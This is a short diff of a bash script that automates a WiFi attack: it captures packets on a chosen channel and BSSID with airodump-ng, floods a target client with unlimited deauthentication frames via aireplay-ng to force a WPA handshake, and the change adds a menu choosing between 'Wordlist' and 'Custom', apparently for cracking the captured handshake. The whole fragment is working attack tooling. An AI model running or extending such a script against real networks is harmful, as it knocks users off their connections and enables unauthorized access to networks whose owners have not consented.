@@ -17,4 +17,6 @@ airodump-ng --ig -w cap -c $chnl --bssid $bid $mon & sleep 6 &&
 xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid -c $client $mon"
 sleep 4
 clear
+echo "1. Wordlist"
+echo "2. Custom"
 read option
